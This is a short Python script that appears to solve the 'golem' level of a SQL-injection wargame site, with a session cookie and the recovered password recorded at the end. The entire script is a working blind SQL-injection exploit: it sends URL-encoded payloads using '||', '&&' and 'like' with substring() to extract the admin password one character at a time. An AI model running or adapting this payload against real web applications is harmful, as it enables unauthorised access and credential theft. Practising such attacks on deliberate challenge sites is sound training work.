
import requests
headers = {'Cookie':'PHPSESSID=g9p30le82066o3e2jc68o1gngs'}
url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
wordlist = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9']
# r = requests.get(url, headers=headers).text
solved=False
currletter = 1
password = ""
while not solved:
    for thing in wordlist:
        statement = f"?pw=%27%20||%20id%20like%20%27admin%27%20%26%26%20substring(pw,{currletter},1)%20like%20%27{thing}%27%23"
        tempurl = url+statement
        # print(tempurl)
        r = requests.get(tempurl, headers=headers).text
        # print(r)
        # print(thing)
        if r"<h2>Hello admin</h2><code>" in r:
            password+=thing
            currletter+=1
            print(thing)
    if len(password)==8:
        solved=True
print(password)

### SOLVED ###
# pw = '77d6290b'